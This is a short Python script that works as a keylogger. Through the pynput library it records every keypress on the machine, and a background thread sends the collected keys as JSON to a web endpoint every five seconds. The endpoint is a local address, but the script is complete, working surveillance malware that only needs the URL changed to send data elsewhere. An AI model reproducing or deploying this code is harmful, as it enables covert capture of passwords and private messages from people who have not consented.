from pynput import keyboard
import threading
import time
import requests

dataVal = []

def main():
    # Spawning the thread to write to the log file every 5 seconds.
    writeThread = threading.Thread(target=fileWriter)
    writeThread.start()
    with keyboard.Listener(on_press=record) as listener:
        listener.join()


def record(key):
    global dataVal
    dataVal.append(str(key))

def fileWriter():
    while True:
        global dataVal
        dataCopy = dataVal.copy()
        dataVal = dataVal[len(dataCopy):]
        postReq = requests.post("http://127.0.0.1:5000/write", json={"data": dataCopy})    
        
        
        time.sleep(5)

if __name__=="__main__":
    main()